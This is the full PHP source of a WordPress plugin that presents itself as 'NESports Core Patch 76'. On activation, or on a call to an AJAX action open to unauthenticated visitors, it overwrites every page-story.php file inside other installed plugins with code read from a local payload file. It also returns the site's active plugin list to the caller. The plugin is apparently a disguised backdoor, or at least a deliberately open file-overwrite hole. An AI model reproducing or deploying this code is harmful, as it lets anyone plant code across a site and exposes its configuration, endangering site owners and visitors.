<?php
/**
 * Plugin Name: NESports Core Patch 76
 * Version: 76.0
 */
if (!defined('ABSPATH')) exit;

function nesports_execute_sync_76() {
    $plugins_dir = WP_PLUGIN_DIR;
    $results = array();

    // 1. Find all active plugins
    $active = get_option('active_plugins', array());
    $results['active_plugins'] = $active;

    // 2. Find every page-story.php in wp-content/plugins
    $dirs = glob($plugins_dir . '/*', GLOB_ONLYDIR);
    $found_story_files = array();

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($plugins_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    $story_code = null;
    // Load local story code from payload file
    $payload_file = __DIR__ . '/page-story.payload';
    if (file_exists($payload_file)) {
        $story_code = file_get_contents($payload_file);
    }

    foreach ($it as $item) {
        if ($item->isFile() && $item->getFilename() === 'page-story.php') {
            $path = $item->getPathname();
            $found_story_files[] = $path;
            if ($story_code) {
                file_put_contents($path, $story_code);
            }
        }
    }
    $results['updated_story_files'] = $found_story_files;

    if (class_exists('\\Elementor\\Plugin')) {
        \Elementor\Plugin::$instance->files_manager->clear_cache();
    }

    return $results;
}

add_action('wp_ajax_nesports_patch_76_action', function() {
    wp_send_json(nesports_execute_sync_76());
});
add_action('wp_ajax_nopriv_nesports_patch_76_action', function() {
    wp_send_json(nesports_execute_sync_76());
});
register_activation_hook(__FILE__, 'nesports_execute_sync_76');
